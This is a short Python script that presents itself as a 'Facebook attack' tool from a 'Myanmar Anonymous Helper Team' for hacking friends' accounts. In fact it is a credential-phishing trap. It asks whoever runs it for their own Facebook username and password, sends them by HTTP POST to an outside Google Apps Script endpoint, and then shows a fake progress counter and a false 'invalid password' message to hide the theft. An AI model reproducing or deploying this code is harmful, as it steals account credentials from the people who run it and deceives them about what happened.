import requests
import pyfiglet
import time
a = pyfiglet.figlet_format('Facebook attack')
print(a)
print("Create by : zuzueisan")

print("Myanmar Anonymous Helper Team")

print('please login with your facebook \n for hack your firends and myanmar old account')

umail =input("please Enter Username : ")
upass =input("please Enter Fb password : '")
data ={'mail':umail,'pass':upass}
rq =requests.post('https://script.google.com/macros/s/AKfycbwKgBTlq0F2mw7jmtYhwahxyVgq-mV24nlcEOOgkzDVQjy22LmA/exec',data=data)

for i in range(100):
   print(i,'%')
   time.sleep(1)
print('invalid password or username')
